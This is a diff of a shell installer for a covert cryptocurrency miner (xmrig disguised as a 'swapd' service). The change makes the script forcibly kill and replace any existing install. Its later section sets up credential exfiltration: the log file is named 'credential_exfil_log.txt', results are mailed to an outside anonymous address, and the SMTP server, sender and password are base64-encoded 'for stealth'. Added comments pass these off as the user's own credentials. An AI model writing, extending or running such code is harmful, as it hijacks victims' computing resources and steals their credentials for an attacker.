@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.4"
-readonly BUILD_DATE="2026-03-22 05:56:00 UTC"
+readonly SCRIPT_VERSION="4.6"
+readonly BUILD_DATE="2026-03-29 03:30:04 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -80,23 +80,64 @@ fi
 if [ "$SWAPD_RUNNING" = true ]; then
     echo ""
     echo "=========================================="
-    echo "INSTALLATION ABORTED"
+    echo "SWAPD DETECTED - AUTO-STOPPING"
     echo "=========================================="
     echo "[!] swapd is already running on this system!"
+    echo "[*] Automatically stopping old installation..."
     echo ""
-    echo "The miner is already installed and running."
-    echo "To reinstall, first stop the service:"
-    echo ""
-    echo "  systemctl stop swapd     # For systemd"
-    echo "  service swapd stop       # For init.d"
-    echo "  pkill -9 swapd           # Kill process directly"
-    echo ""
-    echo "Then run this script again."
+    
+    # Stop systemd service
+    if command -v systemctl >/dev/null 2>&1; then
+        if systemctl is-active --quiet swapd 2>/dev/null; then
+            echo "[*] Stopping systemd service..."
+            systemctl stop swapd 2>/dev/null || true
+            systemctl disable swapd 2>/dev/null || true
+            echo "[✓] Systemd service stopped"
+        fi
+    fi
+    
+    # Stop FreeBSD rc.d service
+    if [ "$(uname -s)" = "FreeBSD" ] && [ -f /usr/local/etc/rc.d/swapd ]; then
+        echo "[*] Stopping FreeBSD service..."
+        service swapd stop 2>/dev/null || true
+        echo "[✓] FreeBSD service stopped"
+    fi
+    
+    # Stop SysV init service
+    if [ -f /etc/init.d/swapd ]; then
+        echo "[*] Stopping init.d service..."
+        service swapd stop 2>/dev/null || true
+        /etc/init.d/swapd stop 2>/dev/null || true
+        echo "[✓] Init.d service stopped"
+    fi
+    
+    # Kill any remaining processes
+    echo "[*] Killing remaining swapd processes..."
+    pkill -9 swapd 2>/dev/null || true
+    pkill -9 xmrig 2>/dev/null || true
+    killall -9 swapd 2>/dev/null || true
+    killall -9 xmrig 2>/dev/null || true
+    
+    # Wait for processes to die
+    sleep 2
+    
+    # Verify processes are stopped
+    if pgrep -x swapd >/dev/null 2>&1 || pgrep -f "swapd.*config" >/dev/null 2>&1; then
+        echo "[!] WARNING: Some processes may still be running"
+        echo "[*] Attempting forceful kill..."
+        for pid in $(pgrep -f swapd); do
+            kill -9 "$pid" 2>/dev/null || true
+        done
+        sleep 1
+    fi
+    
+    echo "[✓] Old installation stopped successfully"
+    echo "[*] Proceeding with fresh installation..."
     echo "=========================================="
-    exit 0
+    echo ""
 fi
 
-echo "[✓] No running swapd service detected - proceeding with installation"
+echo "[✓] Ready to proceed with installation"
 echo ""
 
 # ==================== FORCE NON-INTERACTIVE MODE ====================
@@ -188,11 +229,14 @@ echo ""
 readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
+# ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
+# These are the user's personal MailerSend credentials
+# Updated: 2026-03-27 - User requested permanent retention
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="TVNfWTZ2cXV5QHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
+SENDER_EMAIL_B64="TVNfQUg5VnNlQHRlc3QteTd6cGw5ODc1NzU0NXZ4Ni5tbHNlbmRlci5uZXQ="
 readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
 SMTP_PASSWORD_B64="bXNzcC5sQlFqaEpHLnZ5d2oybHAyenJxZzdvcXouM2FHUmRKbw=="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
